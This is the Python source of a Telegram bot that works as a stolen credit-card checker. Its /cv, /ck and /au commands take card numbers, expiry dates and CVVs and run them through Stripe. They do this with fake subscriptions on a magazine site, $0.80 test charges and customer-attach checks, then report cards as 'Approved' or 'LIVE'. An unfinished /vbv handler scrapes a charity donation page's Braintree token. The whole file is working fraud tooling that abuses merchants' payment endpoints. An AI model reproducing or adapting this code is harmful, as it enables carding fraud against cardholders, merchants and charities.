import logging
import os
import requests
import time
import string
import random
import yaml
import asyncio
import re
import base64
import json


from aiogram import Bot, Dispatcher, executor, types
from aiogram.utils.exceptions import Throttled
from aiogram.contrib.fsm_storage.memory import MemoryStorage


# Configure vars get from env or config.yml
CONFIG = yaml.load(open('config.yml', 'r'), Loader=yaml.SafeLoader)
SK = os.getenv('SK', CONFIG['sk'])
TOKEN = os.getenv('TOKEN', CONFIG['token'])
BLACKLISTED = os.getenv('BLACKLISTED', CONFIG['blacklisted']).split()
PREFIX = os.getenv('PREFIX', CONFIG['prefix'])
OWNER = int(os.getenv('OWNER', CONFIG['owner']))
ANTISPAM = int(os.getenv('ANTISPAM', CONFIG['antispam']))

# Initialize bot and dispatcher
storage = MemoryStorage()
bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot, storage=storage)

# Configure logging
logging.basicConfig(level=logging.INFO)

# BOT INFO
loop = asyncio.get_event_loop()

bot_info = loop.run_until_complete(bot.get_me())
BOT_USERNAME = bot_info.username
BOT_NAME = bot_info.first_name
BOT_ID = bot_info.id

# USE YOUR ROTATING PROXY API IN DICT FORMAT http://user:pass@providerhost:port


session = requests.Session()

# Random DATA
letters = string.ascii_lowercase
First = ''.join(random.choice(letters) for i in range(6))
Last = ''.join(random.choice(letters) for i in range(6))
PWD = ''.join(random.choice(letters) for i in range(10))
Name = f'{First}+{Last}'
Email = f'{First}.{Last}@gmail.com'
UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'


async def is_owner(user_id):
    status = False
    if user_id == OWNER:
        status = True
    return status


@dp.message_handler(commands=['start', 'help'], commands_prefix=PREFIX)
async def helpstr(message: types.Message):
    # await message.answer_chat_action('typing')
    keyboard_markup = types.InlineKeyboardMarkup(row_width=3)
    btns = types.InlineKeyboardButton("Bot Source", url="https://viet69.vc/")
    keyboard_markup.row(btns)
    FIRST = message.from_user.first_name
    MSG = f'''
Hello {FIRST}, I'm bot
BOSS:  <a href="tg://user?id={OWNER}">HERE</a>
Cmds \n/ck Charge 0.8$ \n/bin \n/cv 4.99$\n/vbv check vbv\n/c2d site 2ds'''
    await message.answer(MSG, reply_markup=keyboard_markup,
                        disable_web_page_preview=True)


@dp.message_handler(commands=['info', 'id'], commands_prefix=PREFIX)
async def info(message: types.Message):
    if message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
        is_bot = message.reply_to_message.from_user.is_bot
        username = message.reply_to_message.from_user.username
        first = message.reply_to_message.from_user.first_name
    else:
        user_id = message.from_user.id
        is_bot = message.from_user.is_bot
        username = message.from_user.username
        first = message.from_user.first_name
        print("check by "+first)
    await message.reply(f'''
═════════╕
<b>USER INFO</b>
<b>USER ID:</b> <code>{user_id}</code>
<b>USERNAME:</b> @{username}
<b>FIRSTNAME:</b> {first}
<b>BOT:</b> {is_bot}
<b>BOT-OWNER:</b> {await is_owner(user_id)}
╘═════════''')


@dp.message_handler(commands=['bin'], commands_prefix=PREFIX)
async def binio(message: types.Message):
    await message.answer_chat_action('typing')
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    BIN = message.text[len('/bin '):]
    if len(BIN) < 6:
        return await message.reply(
                   'Send bin not ass'
        )
    r = requests.get(
               f'http://binchk-api.vercel.app/bin={BIN}'
    ).json()        
    print("check by "+FIRST) 
        INFO = f'''
BIN⇢ <code>{BIN}</code>
Brand⇢ <u>{r["brand"]}</u>
Type⇢ <u>{r["type"]}</u>
Level⇢ <u>{r["level"]}</u>
Bank⇢ <u>{r["bank"]}</u>
Phone⇢ <u>{r["phone"]}</u>
Currency⇢ <u>{r["currency"]}</u>
Country⇢ <u>{r["country"]}({r["code"]})[{r["flag"]}]</u>
SENDER: <a href="tg://user?id={ID}">{FIRST}</a>
BOT⇢ @{BOT_USERNAME}
OWNER⇢ <a href="tg://user?id={OWNER}">LINK</a>
'''
    await message.reply(INFO)
    
         
@dp.message_handler(commands=['cv'], commands_prefix=PREFIX)
async def ch(message: types.Message):
    await message.answer_chat_action('typing')
    tic = time.perf_counter()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    try:
        await dp.throttle('cv', rate=ANTISPAM)
    except Throttled:
        await message.reply('<b>Too many requests!</b>\n'
                            f'Blocked For {ANTISPAM} seconds')
    else:
        if message.reply_to_message:
            cc = message.reply_to_message.text
        else:
            cc = message.text[len('/cv '):]

        if len(cc) == 0:
            return await message.reply("<b>You have not filled in the card</b>")

        x = re.findall(r'\d+', cc)
        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]
        if mm.startswith('2'):
            mm, yy = yy, mm
        if len(mm) >= 3:
            mm, yy, cvv = yy, cvv, mm
        if len(ccn) < 15 or len(ccn) > 16:
            return await message.reply('<b>𝘍𝘢𝘪𝘭𝘦𝘥 𝘵𝘰 𝘱𝘢𝘳𝘴𝘦 𝘊𝘢𝘳𝘥</b>\n'
                                       '<b>Reason: 𝐖𝐑𝐎𝐍𝐆 𝐅𝐎𝐑𝐌𝐀𝐓!</b>')   
        BIN = ccn[:6]
        if BIN in BLACKLISTED:
            return await message.reply('<b>BLACKLISTED BIN</b>')
        # get guid muid sid
        headers = {
            "user-agent": UA,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded"
        }

        b = session.get('https://ip.seeip.org/').text

        s = session.post('https://m.stripe.com/6', headers=headers)
        r = s.json()
        Guid = r['guid']
        Muid = r['muid']
        Sid = r['sid']

        # hmm
        load = {
            "guid": Guid,
            "muid": Muid,
            "sid": Sid,
            "key": "pk_live_oljKIizPrbgI4FSG4XcYnPLx",
            "card[name]": Name,
            "card[number]": ccn,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[cvc]": cvv
        }

        header = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": UA,
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "accept-language": "en-US,en;q=0.9"
        }

        rx = session.post('https://api.stripe.com/v1/tokens',
                          data=load, headers=header)
        token = rx.json()['id']
        res = rx.json()
        card = res['card']
        country = card['country']
        brand = card['brand']
        funding = card['funding']
        LastF = f'************{ccn[-4:]}'

        payload = {
            "subscription_type": "digital",
            "first_name": First,
            "last_name": Last,
            "email": Email,
            "login_pass": PWD,
            "confirm_pass": PWD,
            "shipping_country": "United+States",
            "card_number": LastF,
            "card_cvc": cvv,
            "card_expiry_month": mm,
            "card_expiry_year": yy,
            "action": "register",
            "stripe_token": token,
            "last4": token
        }

        head = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": UA,
            "origin": "https://preludemag.com",
            "referer": "https://preludemag.com/subscribe/",
            "accept-language": "en-US,en;q=0.9"
        }

        ri = session.post('https://preludemag.com/subscribe/', data=payload,
                          headers=head)
        toc = time.perf_counter()

        if 'success' in ri.text:
            return await message.reply(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #ApprovedCVV
<b>MSG</b>➟ {ri.text}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'incorrect_cvc' in ri.text:
            return await message.reply(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #ApprovedCCN
<b>MSG</b>➟ {ri.text}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'declined' in ri.text:
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Declined 4.99$
<b>MSG</b>➟ {ri.text}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

        await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ DEAD
<b>MSG</b>➟ {ri.text}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

@dp.message_handler(commands=['ck'], commands_prefix=PREFIX)
async def ch(message: types.Message):
  await message.answer_chat_action('typing')
  tic = time.perf_counter()
  ID = message.from_user.id
  FIRST = message.from_user.first_name
  try:
        await dp.throttle('ck', rate=ANTISPAM)
  except Throttled:
        await message.reply('<b>Too many requests!</b>\n'
                            f'Blocked For {ANTISPAM} seconds')
  else:
      if message.reply_to_message:
            cc = message.reply_to_message.text
      else:
            cc = message.text[len('/ck '):]

      if len(cc) == 0:
            return await message.reply("<b>You have not filled in the card</b>")

      x = re.findall(r'\d+', cc)
      ccn = x[0]
      mm = x[1]
      yy = x[2]
      cvv = x[3]
      if mm.startswith('2'):
            mm, yy = yy, mm
      if len(mm) >= 3:
            mm, yy, cvv = yy, cvv, mm
      if len(ccn) < 15 or len(ccn) > 16:
            return await message.reply('<b>𝘍𝘢𝘪𝘭𝘦𝘥 𝘵𝘰 𝘱𝘢𝘳𝘴𝘦 𝘊𝘢𝘳𝘥</b>\n'
                                       '<b>Reason: 𝐖𝐑𝐎𝐍𝐆 𝐅𝐎𝐑𝐌𝐀𝐓!</b>')   
      BIN = ccn[:6]
      if BIN in BLACKLISTED:
            return await message.reply('<b>BLACKLISTED BIN</b>')
      headers = {
            "user-agent": UA,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded"
        }

      b = session.get('https://ip.seeip.org/').text

      s = session.post('https://m.stripe.com/6', headers=headers)
      r = s.json()
      Guid = r['guid']
      Muid = r['muid']
      Sid = r['sid']

        # hmm
      load = {
            "guid": Guid,
            "muid": Muid,
            "sid": Sid,
            "card[number]": ccn,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[cvc]": cvv
        }

      header = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "authorization": SK,
            "user-agent": UA,
            "accept-language": "en-US,en;q=0.9"

        }
      print("check by "+FIRST)
      rx =  requests.post('https://api.stripe.com/v1/tokens',
                          data=load, headers=header)
      res = rx.json()
      LastF = f'************{ccn[-4:]}'
      toc11 = time.perf_counter()
      toc1 = toc11 - tic
      if 'declined' in rx.text:
            
            msg = res['error']['message']
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {msg}
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc1:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>

<b>BOT</b>: @{BOT_USERNAME}''')
      if 'incorrect_number' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Incorrect_number
<b>MSG</b>➟ Your card number is incorrect.
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc1:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')
      if 'Request rate limit exceeded.' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Request rate limit exceeded.
<b>MSG</b>➟ {msg}
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc1:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

      if 'API Key provided' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ API Key provided
<b>MSG</b>➟ {msg}
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc1:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')
      if 'security code is invalid' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Security code is invalid.
<b>MSG</b>➟ {msg}
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc1:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')
       
      else:
        token = rx.json()['id'] 
        payload = {
            "amount": "80",
            "currency": "USD",            
            "source": token           
        }

        head = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "authorization": SK,
            "user-agent": UA,
            "accept-language": "en-US,en;q=0.9"
        }
        

        ri =  requests.post('https://api.stripe.com/v1/charges', data=payload,
                          headers=head)
        res1 = ri.json()
        msg1 = res1['error']['message']
        card = res['card']
        country = card['country']
        brand = card['brand']
        funding = card['funding']

        toc22 = time.perf_counter()
        toc2 = toc22 - tic + toc1
        print("check by "+FIRST)
        if 'Payment complete' in ri.text:

            return await message.reply(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Charge 0.8$✅
<b>MSG</b>➟ Payment complete!

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'incorrect_cvc' in ri.text:
            return await message.reply(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #ApprovedCCN
<b>MSG</b>➟ {msg1}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')
        if 'Request rate limit exceeded.' in ri.text:
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Request rate limit exceeded.
<b>MSG</b>➟ {msg1}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'API Key provided' in ri.text:
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ API Key provided
<b>MSG</b>➟ {msg1}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'insufficient_funds' in ri.text:
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Insufficient_funds
<b>MSG</b>➟ {msg1}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'declined' in ri.text:
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {msg1}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

        await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ DEAD
<b>MSG</b>➟ {msg1}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

@dp.message_handler(commands=['au'], commands_prefix=PREFIX)
async def ch(message: types.Message):
  await message.answer_chat_action('typing')
  tic = time.perf_counter()
  ID = message.from_user.id
  FIRST = message.from_user.first_name
  try:
        await dp.throttle('ck', rate=ANTISPAM)
  except Throttled:
        await message.reply('<b>Too many requests!</b>\n'
                            f'Blocked For {ANTISPAM} seconds')
  else:
      if message.reply_to_message:
            cc = message.reply_to_message.text
      else:
            cc = message.text[len('/ck '):]

      if len(cc) == 0:
            return await message.reply("<b>You have not filled in the card</b>")

      x = re.findall(r'\d+', cc)
      ccn = x[0]
      mm = x[1]
      yy = x[2]
      cvv = x[3]
      if mm.startswith('2'):
            mm, yy = yy, mm
      if len(mm) >= 3:
            mm, yy, cvv = yy, cvv, mm
      if len(ccn) < 15 or len(ccn) > 16:
            return await message.reply('<b>𝘍𝘢𝘪𝘭𝘦𝘥 𝘵𝘰 𝘱𝘢𝘳𝘴𝘦 𝘊𝘢𝘳𝘥</b>\n'
                                       '<b>Reason: 𝐖𝐑𝐎𝐍𝐆 𝐅𝐎𝐑𝐌𝐀𝐓!</b>')   
      BIN = ccn[:6]
      if BIN in BLACKLISTED:
            return await message.reply('<b>BLACKLISTED BIN</b>')
      headers = {
            "user-agent": UA,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded"
        }

      b = session.get('https://ip.seeip.org/').text

      s = session.post('https://m.stripe.com/6', headers=headers)
      r = s.json()
      Guid = r['guid']
      Muid = r['muid']
      Sid = r['sid']

        # hmm
      load = {
            "guid": Guid,
            "muid": Muid,
            "sid": Sid,
            "card[number]": ccn,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[cvc]": cvv
        }

      header = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "authorization": SK,
            "user-agent": UA,
            "accept-language": "en-US,en;q=0.9"

        }

      rx =  requests.post('https://api.stripe.com/v1/tokens',
                          data=load, headers=header)
      LastF = f'************{ccn[-4:]}'
      toc11 = time.perf_counter()
      toc1 = toc11 - tic
      if 'declined' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {msg}
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc11 - tic:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>

<b>BOT</b>: @{BOT_USERNAME}''')
      if 'incorrect_number' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Incorrect_number
<b>MSG</b>➟ Your card number is incorrect.
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc11 - tic:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>

<b>BOT</b>: @{BOT_USERNAME}''')
      if 'Request rate limit exceeded.' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Request rate limit exceeded.
<b>MSG</b>➟ {msg}
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc11 - tic:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>

<b>BOT</b>: @{BOT_USERNAME}''')

      if 'API Key provided' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ API Key provided
<b>MSG</b>➟ {msg}
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc11 - tic:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>

<b>BOT</b>: @{BOT_USERNAME}''')
       
      else:
        token = rx.json()['id'] 
        payload = {
            "email": "check@gmail.com",
            "address[line1]": "36%20Regent%20St",
            "address[city]": "Jamestown",
            "address[state]": "NY",
            "address[postal_code]": "14701",
            "address[country]": "US",
            "source": token           
        }

        head = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "authorization": SK,
            "user-agent": UA,
            "accept-language": "en-US,en;q=0.9"
        }
        

        rx =  requests.post('https://api.stripe.com/v1/customers?email=concainit@gmail.com&description=nit&source=<tok>&address[line1]=36%20Regent%20St&address[city]=Jamestown&address[state]=NY&address[postal_code]=14701&address[country]=US', data=payload,
                          headers=head)
        res1 = rx.json()


        toc21 = time.perf_counter()
        toc2 = toc21 - tic + toc1
        

        if 'declined' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {msg}
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>

<b>BOT</b>: @{BOT_USERNAME}''')
        if 'incorrect_number' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Incorrect_number
<b>MSG</b>➟ Your card number is incorrect.
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>

<b>BOT</b>: @{BOT_USERNAME}''')
        if 'Request rate limit exceeded.' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Request rate limit exceeded.
<b>MSG</b>➟ {msg}
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>

<b>BOT</b>: @{BOT_USERNAME}''')

        if 'API Key provided' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ API Key provided
<b>MSG</b>➟ {msg}
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc2:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')
        
        if 'cus' in rx.text:
         cus = rx.json()['id']
         card = rx.json()['default_source']
        
         head = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "authorization": SK,
            "user-agent": UA,
            "accept-language": "en-US,en;q=0.9"
        }
         payload2 = { 
              
         }
        

         rc =  session.post('https://api.stripe.com/v1/customers/'+cus+'/sources/'+card+'', data=payload2, headers=head)
         res2 = rc.json()        
         toc31 = time.perf_counter()
         toc3 = toc31 - tic
         toc = toc1 + toc2 + toc3
         print("check by "+FIRST)
                         
         if 'Request rate limit exceeded.' in rc.text:
            
            msg = res2['error']['message']
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Request rate limit exceeded.
<b>MSG</b>➟ {msg}
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>

<b>BOT</b>: @{BOT_USERNAME}''')
         if 'pass' in rc.text:
            return await message.reply(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ LIVE STRIPE
<b>MSG</b>➟ cvc_check: "pass"
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')
         if 'unavailable' in rc.text:
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>MSG</b>➟ cvc_check: "unavailable"
<b>IP</b> <code>{b}</code>
<b>TIME:</b> <code>{toc:0.2f}</code>(s)
<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT</b>: @{BOT_USERNAME}''')

@dp.message_handler(commands=['vbv'], commands_prefix=PREFIX)
async def ch(message: types.Message):
    await message.answer_chat_action('typing')
    tic = time.perf_counter()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    try:
        await dp.throttle('cv', rate=ANTISPAM)
    except Throttled:
        await message.reply('<b>Too many requests!</b>\n'
                            f'Blocked For {ANTISPAM} seconds')
    else:
        if message.reply_to_message:
            cc = message.reply_to_message.text
        else:
            cc = message.text[len('/cv '):]

        if len(cc) == 0:
            return await message.reply("<b>You have not filled in the card</b>")

        x = re.findall(r'\d+', cc)
        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]
        if mm.startswith('2'):
            mm, yy = yy, mm
        if len(mm) >= 3:
            mm, yy, cvv = yy, cvv, mm
        if len(ccn) < 15 or len(ccn) > 16:
            return await message.reply('<b>𝘍𝘢𝘪𝘭𝘦𝘥 𝘵𝘰 𝘱𝘢𝘳𝘴𝘦 𝘊𝘢𝘳𝘥</b>\n'
                                       '<b>𝐖𝐑𝐎𝐍𝐆 𝐅𝐎𝐑𝐌𝐀𝐓</b>')   
        BIN = ccn[:6]
        if BIN in BLACKLISTED:
            return await message.reply('<b>BLACKLISTED BIN</b>')
    
        headers = {
            "user-agent": UA,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded"
        }

        b = session.get('https://ip.seeip.org/').text
         # get guid muid sid
        headers = {
            "user-agent": UA,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded"
        }

        b = session.get('https://ip.seeip.org/').text

        s = session.post('https://m.stripe.com/6', headers=headers)
        r = s.json()
        Guid = r['guid']
        Muid = r['muid']
        Sid = r['sid']

        LastF = f'************{ccn[-4:]}'

  
        head = {
            "user-agent": UA,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded"
        }

        r2 = session.get('https://charliewaller.org/umbraco/BraintreeDonation/BraintreeDonationSurface/ClientToken',
                          headers=head)
        
        clientToken1 = r2.json()['clientToken']  
        clientToken = base64.b64decode(clientToken1)
        
        content = json.loads(clientToken.decode('utf-8'))        
        bearer = content['authorizationFingerprint']
        
        
        toc11 = time.perf_counter()
        toc1 = toc11 - tic

